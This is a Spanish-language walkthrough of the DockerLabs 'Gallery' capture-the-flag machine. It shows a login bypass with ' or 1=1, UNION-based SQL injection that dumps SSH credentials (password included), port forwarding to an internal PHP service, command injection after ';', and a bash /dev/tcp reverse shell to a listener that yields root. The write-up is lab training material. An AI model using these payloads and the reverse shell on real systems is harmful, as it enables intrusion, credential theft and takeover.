## Descarga y montaje de la máquina
Desde https://dockerlabs.es/ buscamos la máquina vulnerable Gallery, y bajamos el zip:
https://mega.nz/file/ONlzkaAC#xPFZFyFo_ZxcSN-DoOdI5yqp7UJb3ugxNnM23UzcRww

Creamos carpeta:
```
mkdir Gallery
cd !$
```

Movemos el zip descargado:
```
mv /home/kali/Downloads/Gallery.zip .
```

Descomprimimos:
```
unzip Gallery.zip
```

Borramos el zip:
```
rm Gallery.zip
```

Montamos la máquina:
```
sudo bash auto_deploy.sh gallery.tar
```

✅ IP de la máquina desplegada:
```
172.17.0.2
```

Comprobamos conectividad:
```
ping -c 1 172.17.0.2
# TTL=64 → Linux
```

## Enumeración

Escaneo de puertos:
```
sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN puertosYservicios
```

🔎 Servicios:
- 22/tcp OpenSSH 9.6
- 80/tcp PHP cli server 8.3.6

Nos centramos en el servicio HTTP

## Enumeración Web

Whatweb:
```
whatweb 172.17.0.2 -v
```

Encontramos botón login (/login.php)

Probamos login con inyección:
```
username: ' or 1=1-- -
```
✅ funciona

Entramos en `/dashboard.php`

🧪 Test SQLi (time-based):
```
' and sleep(2)-- -
```
→ en parámetro `search_term`

puede hacerse en el parámetro o en la URL--> "http://172.17.0.2/dashboard.php?search_term=' and sleep(2)-- -"  pondré la inyeccion
en el recuadro de "search"

Ordenamos columnas:
```
' ORDER BY 1-- -
```
→ hasta que falla en `ORDER BY 6` , luego las columnas válidas son 5.

Identificamos columnas reflejadas:
```
' UNION SELECT 1,2,3,4,5-- -
```
→ visibles 2 y 3

Listamos bases de datos:
```
' UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata-- -
```

🎯 Bases de datos interesantes:
- gallery_db
- secret_db

Listamos tablas en `secret_db`:
```
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema="secret_db"-- -
```

Obtenemos tabla: `secret`

Listamos columnas:
```
' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_schema="secret_db" AND table_name="secret"-- -
```
Obtenemos-->ssh_users y ssh_pass

Extraemos datos:
```
' UNION SELECT 1,CONCAT(ssh_users,0x3a,ssh_pass),3,4,5 FROM secret_db.secret-- -
```

🗝️ Credenciales:
```
sam:$uper$ecretP4$$w0rd123
```

## Acceso SSH

```
ssh sam@172.17.0.2
```

🔑 Contraseña:
```
$uper$ecretP4$$w0rd123
```

## Escalada de privilegios

Verificamos procesos y puertos → puerto `8888` local
```
ps aux
```
esta parte nos indica que hay un puerto interno abierto con servicio php
```
php -S 127.0.0.1:8888
```

⏩ Hacemos port forwarding:

la sintaxis es la siguiente:
```
ssh -L <puerto_local>:<host_remoto>:<puerto_remoto> usuario@host_remoto
```
```
ssh -L 8888:127.0.0.1:8888 sam@172.17.0.2
```

Visitamos:
```
http://localhost:8888
```

Shell vulnerable detectada inyectando un comando después de ";" ( < comando valido > ; < comando malicioso > ) :
```
help;id
```
→ root

Abrimos listener:
```
nc -nvlp 445
```

Lanzamos reverse shell:
```
help; bash -c "bash -i >& /dev/tcp/172.17.0.1/445 0>&1"
```

🐚 Shell recibida:
```
uid=0(root) gid=0(root) groups=0(root)
```

🎉 ¡Root obtenido!
